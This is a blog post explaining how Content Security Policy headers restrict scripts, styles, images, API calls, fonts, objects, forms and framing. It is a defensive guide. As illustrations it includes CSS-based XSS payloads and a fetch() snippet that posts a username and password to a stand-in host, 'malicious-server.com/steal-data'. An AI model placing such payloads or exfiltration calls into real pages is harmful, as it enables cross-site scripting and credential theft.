---
layout: post
unique_id: STARTRIGHT-02

title: CSP - Block Everything You Don't Need
subtitle: Securing Websites from Attacks Using CSP Headers
tldr: Using CSP headers can drastically reduce the attack surface for your website by disallowing anything you don't expect.
permalink: /blog/start-right/ui-csp
author: srungta
tags:
  - Start Right
  - Frontend
  - CSP
  - Security

series:
  id: STARTRIGHT
  index: 2
---

* TOC
{:toc}

### Understanding Content Security Policy (CSP)

Content Security Policy (CSP) is essentially a header that your server sends to the frontend. The header value tells the browser what exactly it should allow to run. Anything that violates the CSP policy is blocked implicitly by the browser. It is very simple and super powerful.

### Block Everything Because Someone Will Find a Way to Exploit It

Inevitably, if you leave a surface open, someone will exploit it. Why take unnecessary risks? Simply block whatever you do not recognize.

#### Block All JavaScript

JavaScript is the most problematic of all. Atackers will try to run their malicious code on your site and try to harm your users. Just this simple configuration will block a lot of reflected and stored XSS attacks.

| Config                                       | Recommendation                                                                                                                                                                                                               |
| -------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `script-src: 'none'`                         | ✅ Don't allow any scripts. Best configuration if your website can work with this.                                                                                                                                           |
| `script-src: 'self'`                         | ✅ You almost never need to load JavaScript from a different domain. So why allow it?                                                                                                                                        |
| `script-src: 'nonce-abc123'`                 | ✅ Use when you have some inline JavaScript written via `<script>` tags. Also use if you are using `<script>` tags to load your JavaScript file. Longer discussion on nonce is at [this post](./ui-nonce).                   |
| `script-src: 'strict-dynamic'`               | ⚠ Use this when you rely on dynamically loaded scripts (your script downloading other scripts). It allows scripts loaded by trusted sources to execute but blocks others. Combine with nonces or hashes for better security. |
| `script-src: 'unsafe-inline'`                | ❌ **Avoid this** unless absolutely necessary. It allows inline scripts, which can be a major security risk. Use nonces or hashes instead.                                                                                   |
| `script-src: https://trusted.cdn.com`        | ✅ Specify trusted third-party domains explicitly. Only allow scripts from domains you trust completely.                                                                                                                     |
| `script-src: 'self' https://apis.google.com` | ⚠ Example of combining self-hosted scripts with a specific trusted third-party domain. Useful for integrating specific APIs or libraries. **Triple-check what domains you allow.**                                           |
| `script-src: 'report-sample'`                | ⚠ **Does not actually enforce the policy.** Use this to include samples of blocked scripts in violation reports. Helps in debugging and refining your CSP policy.                                                            |

#### Block All CSS

CSS looks innocent as it is used for styling, but it can also be exploited.  
For example: `<DIV STYLE="width: expression(alert('XSS'));">` or `<DIV STYLE="background-image: url(javascript:alert('XSS'))">` can cause the browser to run unexpected JavaScript.  
Solution? Block what you don't recognize.

| Config                                           | Recommendation                                                                                                                                                                     |
| ------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `style-src: 'none'`                              | ✅ Don't allow any styles. Best configuration if your website can work without any external or inline styles.                                                                      |
| `style-src: 'self'`                              | ✅ Only allow styles from your own domain. This is a good default for most websites.                                                                                               |
| `style-src: 'nonce-abc123'`                      | ✅ Use when you have inline styles that need to be trusted. Nonces ensure only authorized inline styles are executed.                                                              |
| `style-src: 'unsafe-inline'`                     | ❌ **Avoid this** unless absolutely necessary. It allows inline styles, which can be a security risk. Use nonces or hashes instead.                                                |
| `style-src: https://trusted.cdn.com`             | ✅ Specify trusted third-party domains explicitly. Only allow styles from domains you trust completely.                                                                            |
| `style-src: 'self' https://fonts.googleapis.com` | ⚠ Example of combining self-hosted styles with a specific trusted third-party domain. Useful for integrating specific fonts or libraries. **Triple-check what domains you allow.** |

#### Block All Images

Images can also be a source of security risks, especially if they are loaded from untrusted domains. Attackers can use image URLs to exfiltrate data or execute malicious code. Or simply link to an image that is multiple GBs in size.

| Config                         | Recommendation                                                                                    |
| ------------------------------ | ------------------------------------------------------------------------------------------------- |
| `img-src: 'none'`              | ✅ Block all images. Best for websites that do not rely on images.                                |
| `img-src: 'self'`              | ✅ Allow images only from your own domain.                                                        |
| `img-src: https://trusted.com` | ✅ Specify trusted third-party domains explicitly. Only allow images from domains you trust.      |
| `img-src: 'self' data:`        | ⚠ Allow self-hosted images and inline base64-encoded images. Use cautiously and only if required. |

#### Block All API Calls

APIs are often used to fetch sensitive data. Restricting API calls ensures that only trusted endpoints are accessed. Attackers try to inject JavaScript into your website and make calls to their endpoints to exfiltrate sensitive information. This header blocks such attempts.

**Example Scenario**:  
Imagine a malicious actor injects a script into your website that sends user credentials to an external server. For instance, the attacker could use the following script:

```javascript
fetch("https://malicious-server.com/steal-data", {
  method: "POST",
  body: JSON.stringify({ username: "user123", password: "password123" }),
});
```

If your CSP includes a directive like `connect-src: 'self'`, the browser will block this request because the domain `https://malicious-server.com` is not allowed. This prevents the attacker from successfully exfiltrating the data. By restricting API calls to trusted domains, you significantly reduce the risk of data theft and unauthorized access.

| Config                         | Recommendation                                                                               |
| ------------------------------ | -------------------------------------------------------------------------------------------- |
| `connect-src: 'none'`          | ✅ Block all API calls. Best for static websites that do not need to fetch data dynamically. |
| `connect-src: 'self'`          | ✅ Allow API calls only to your own domain.                                                  |
| `connect-src: https://api.com` | ✅ Specify trusted third-party APIs explicitly. Only allow calls to domains you trust.       |
| `connect-src: 'self' wss:`     | ⚠ Allow WebSocket connections along with self-hosted API calls. Use only if necessary.       |

#### Block All Fonts

Fonts can be exploited to load malicious content or track users. An attacker could inject CSS that attempts to load extremely large font files from external, potentially slow, or unavailable servers. They can define a series of custom font families where each "glyph" in the font corresponds to a specific piece of information (e.g., different characters in a secret). Then, through carefully crafted CSS selectors and properties (like `content`), they can dynamically apply these "data-encoded" fonts based on the content of specific elements on the page. When the browser renders the text with the attacker's font, it effectively transmits the data as font glyphs.

| Config                                | Recommendation                                                                                     |
| ------------------------------------- | -------------------------------------------------------------------------------------------------- |
| `font-src: 'none'`                    | ✅ Block all fonts. Best for websites that do not rely on custom fonts.                            |
| `font-src: 'self'`                    | ✅ Allow fonts only from your own domain.                                                          |
| `font-src: https://trusted-fonts.com` | ✅ Specify trusted third-party font providers explicitly. Only allow fonts from domains you trust. |

#### Block All Objects

The `object-src` directive controls the sources from which `<object>`, `<embed>`, and `<applet>` elements can load content. These elements can be exploited to load malicious content or execute harmful scripts. For example, an attacker could embed a malicious Flash file or other object that exploits vulnerabilities in the user's browser or plugins.

| Config                            | Recommendation                                                                                    |
| --------------------------------- | ------------------------------------------------------------------------------------------------- |
| `object-src: 'none'`              | ✅ Block all objects. Best for websites that do not rely on `<object>`, `<embed>`, or `<applet>`. |
| `object-src: 'self'`              | ✅ Allow objects only from your own domain.                                                       |
| `object-src: https://trusted.com` | ✅ Specify trusted third-party domains explicitly. Only allow objects from domains you trust.     |

By using `object-src: 'none'`, you can eliminate the risk of malicious objects being loaded on your website. This is especially important as plugins like Flash are deprecated and pose significant security risks.

#### Block All Form Actions

Forms can be used to submit sensitive data. Restricting form actions ensures data is only sent to trusted endpoints.  
An attacker can create a malicious HTML page on a completely different domain. This page can contain a `<form>` that is crafted to mimic a legitimate form on your website. The `action` attribute of this malicious form will point to a sensitive endpoint on your website (e.g., changing a user's email, transferring funds, or modifying settings). If the user is logged into your website at the time, the malicious form submission will be executed with their credentials, potentially leading to unauthorized actions and data theft.

If your forms submit sensitive data (even if over HTTPS), and you don't restrict the submission targets with `form-action`, an attacker could potentially trick users into submitting this data to a domain they control.

| Config                             | Recommendation                                                                                  |
| ---------------------------------- | ----------------------------------------------------------------------------------------------- |
| `form-action: 'none'`              | ✅ Block all form submissions. Best for websites that do not use forms.                         |
| `form-action: 'self'`              | ✅ Allow form submissions only to your own domain.                                              |
| `form-action: https://trusted.com` | ✅ Specify trusted third-party domains explicitly. Only allow submissions to domains you trust. |

#### Block Rendering in iframes

iframes can be exploited for clickjacking attacks or to load malicious content. For example, imagine a user logged into their online banking portal. An attacker creates a malicious website with a deceptive button labeled "Win a Free Prize!". Behind this button, the attacker embeds the user's banking portal in an `<iframe>` and carefully aligns the "Transfer Funds" button from the banking site directly beneath the "Win a Free Prize!" button. The `<iframe>` is styled to be mostly transparent, making it invisible to the user. When the user, unaware of the hidden `<iframe>`, clicks the "Win a Free Prize!" button, they inadvertently trigger the "Transfer Funds" action on their bank's website. This could result in unauthorized transactions, transferring money to the attacker.  
Blocking or restricting iframe usage with CSP can prevent such attacks by ensuring your website cannot be embedded in untrusted domains.

| Config                                 | Recommendation                                                                                     |
| -------------------------------------- | -------------------------------------------------------------------------------------------------- |
| `frame-ancestors: 'none'`              | ✅ Block all embedding of your site in iframes. Prevents clickjacking attacks.                     |
| `frame-ancestors: 'self'`              | ✅ Allow embedding only on your own domain. Use this **only** if you really need iframe embedding. |
| `frame-ancestors: https://trusted.com` | ✅ Specify trusted domains explicitly. Only allow embedding on domains you trust.                  |

### Where/How to add CSP?

CSP is implemented using the `Content-Security-Policy` HTTP header or a `<meta>` tag in your HTML. For example:

```
Content-Security-Policy: script-src 'self' https://trusted.cdn.com; style-src 'self';
```

If you cannot set HTTP headers, you can use a `<meta>` tag in your HTML to define the CSP. Here's an example:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self';"
/>
```

> This approach is less secure than using HTTP headers because it can be modified by attackers if they gain control of your HTML. Use it only as a fallback.

### Using Nonces with CSP

> There is a detailed post about nonces [at this link](./ui-nonce)

Nonces are unique, cryptographically secure tokens generated for each HTTP response. They are used to mark inline scripts and styles as trusted. Here's how it works:

- The server generates a unique nonce for each page load.
- The nonce is included in the `Content-Security-Policy` header:

```
Content-Security-Policy: script-src 'nonce-abc123';
```

- Inline scripts include the nonce as an attribute:

```html
<script nonce="abc123">
  console.log("This script is trusted.");
</script>
```

- The browser executes only scripts with the correct nonce.

### Best Practices for Implementing CSP

- **Generally avoid `'unsafe-inline'`**, because it defeats much of the purpose of having a CSP.
- **`'unsafe-hashes'` value is also unsafe.** However, `'unsafe-hashes'` is much safer than `'unsafe-inline'`.
- **Triple-check what domains you allow** in any of the CSPs. IF you are doubtful, remove instead of adding the domain.
- **Start with a Report-Only Mode**: Use the `Content-Security-Policy-Report-Only` header to test your policy without blocking content.
- **Use Nonces or Hashes**: Avoid the `'unsafe-inline'` directive, and use nonces or hashes to allow trusted inline scripts and styles.
- **Monitor Violations**: Set up a reporting endpoint to collect CSP violation reports and refine your policy.

### Example CSP Header

Here’s an example of a robust CSP header:
✅ Good CSP

```
Content-Security-Policy:
   script-src 'strict-dynamic' 'nonce-rAnd0m123' 'unsafe-inline' http: https:;
object-src 'none';
base-uri 'none';
require-trusted-types-for 'script';
report-uri https://csp.example.com;
```

❌ Bad CSP

```
Content-Security-Policy:
script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js  https://*.gstatic.com/feedback/ https://ajax.googleapis.com;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com;
default-src 'self' * 127.0.0.1 https://[2a00:79e0:1b:2:b466:5fd9:dc72:f00e]/foobar;
img-src https: data:;
child-src data:;
foobar-src 'foobar';
report-uri http://csp.example.com;
```

### Conclusion

Content Security Policy is a critical tool for securing modern web applications. By carefully defining and enforcing a CSP, you can protect your users and your application from a wide range of attacks. Start small, monitor violations, and refine your policy to achieve a balance between security and functionality.
